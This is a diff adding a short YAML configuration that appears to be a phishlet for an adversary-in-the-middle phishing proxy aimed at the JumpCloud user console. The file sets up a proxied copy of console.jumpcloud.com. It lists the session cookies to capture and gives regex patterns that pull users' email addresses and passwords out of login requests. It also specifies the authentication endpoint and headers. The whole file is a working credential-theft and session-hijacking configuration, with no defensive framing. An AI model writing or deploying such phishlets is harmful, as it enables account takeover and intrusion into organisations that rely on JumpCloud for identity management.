@@ -1,0 +1,28 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'console', orig_sub: 'console', domain: 'jumpcloud.com', session: true, is_landing: true, auto_filter: true}
+
+auth_tokens:
+  - domain: '*.jumpcloud.com'
+    keys: ['_jumpcloud_user_console_', '_xsrf', '_jca_']
+
+credentials:
+  username:
+    key: 'email'
+    search: '"email":"(.*?)"'
+    type: 'post'
+    
+  password:
+    key: 'password'
+    search: '"password":"(.*?)"'
+    type: 'post'
+
+login:
+  domain: 'console.jumpcloud.com'
+  path: '/userconsole/auth'
+  method: 'POST'
+  headers:
+    'Content-Type': 'application/json'
+    'X-Requested-With': 'XMLHttpRequest'
+    'X-Xsrftoken': '{{_xsrf}}'
+  body_format: 'json'
